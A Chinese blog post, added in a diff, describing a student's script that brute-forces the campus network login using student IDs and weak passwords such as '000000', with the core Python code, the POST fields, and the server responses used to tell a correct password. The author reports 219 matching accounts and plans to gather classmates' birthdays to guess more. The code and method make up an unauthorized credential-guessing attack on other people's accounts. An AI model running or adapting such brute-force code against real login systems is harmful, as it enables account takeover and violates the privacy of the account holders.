@@ -1,0 +1,65 @@
+---
+date: 2012-03-12 11:35:06+00:00
+layout: post
+title: 校园账户弱口令调查（一）
+categories: [Python]
+description: "之前CSDN等的网站密码被暴库，但是眼睛雪亮的人民群众发现IT网民居然有很多用弱口令作为登陆密码。很想知道在学校里，大家又是否使用弱口令作为密码。"
+---
+
+之前CSDN等的网站密码被暴库，但是眼睛雪亮的人民群众发现IT网民居然有很多用弱口令作为登陆密码。很想知道在学校里，大家又是否使用弱口令作为密码。
+
+最近写了几十行python代码，用学号作为账号，用类似‘000000’等弱口令暴搜，然后根据返回的参数判断是否登陆成功，最后把成功登陆的账号密码记录下来。
+
+以下是核心代码，当然全部代码不止这些，post登陆还需要处理cookies等信息，好在python够强大，这些不用操心。如有疑问，《[python发送GET或POST请求以便干一些趣事](http://nodex.iteye.com/blog/740183)》，这篇文章可能对你有帮助。
+
+    
+    log_url = 'http://10.0.0.55/cgi-bin/do_login' #登陆网址
+    #首先把密码MD5
+    a = md5.new(str(password))
+    pswd = a.hexdigest()
+    login_pswd = pswd[8:-8]#取中间16位
+    login_info = {
+                'drop' : 0, #1为仅访问免费资源，0为可以使用国际流量
+                'n' : 100, #100为正常登陆，1为强制注销
+                'password' : login_pswd,
+                'type': 1,
+                'username' : user}
+    req = urllib2.Request(
+                log_url,
+                urllib.urlencode(login_info))
+    resp = urllib2.urlopen(req)
+    revalue = resp.read()
+    if revalue == 'username_error':
+        fo.seek(0,2)
+    elif re.search('[^a-z]',revalue[0:1]) or revalue == 'status_error' or revalue ==       'usernum_error':#判断密码是否正确
+        fw.write(user+'n')
+        fw.write(password+'n')
+        fo.seek(0,2)
+    else:
+        pass
+
+
+其中需要post的数据有：
+
+1. drop：1为仅访问免费资源，0为可以使用国际流量
+2. n：100为正常登陆，1为强制注销
+3. password：这个不解释，注意的是需要变成16位MD5密码
+4. type：这个作用暂时不知道
+5. username：这个也不解释
+
+至于需要post什么内容，这时候就要用到firefox里强大的[firebug](http://getfirebug.com/)插件了，post后会返回一串字符，通过字符就能判断登陆情况。以下是一些常见情况和返回内容
+
+* 登陆成功：一串数字字符
+* 用户名错误：username_error
+* 密码错误：password_error
+* 欠费：status_error
+* 人数达到上限：usernum_error
+* IP已经存在：ip_exist_error
+* 注销成功：logout_ok
+
+
+一切准备就绪后可以开始。我判断密码正确的条件是1.登陆成功 2.欠费 3.人数达到上限。经过一轮暴搜，发现同学们还是挺多人使用弱口令作为密码，尤其是000000或与账号相同。根据记录，08级-11级四个年级加起来共有219个账号符合以上3个条件。
+
+随后我使用客户端尝试登陆这些账号，却发现全是欠费状态。这时我才想到，这些账号会不会都已经是废弃不用的呢，于是“欠费”不算登陆成功条件再暴搜一遍，这回结果发现四个年级只有一个账号不是欠费的。你猜对了！其他218个账号全是欠费的，这证实我刚才的想法。看来我们大学生在网络上还是有些自我保护意识的。
+
+但我认为这并不说明同学不使用弱口令做密码，接下来我将想办法获取用户的生日，然后使用生日来作为密码尝试登陆。
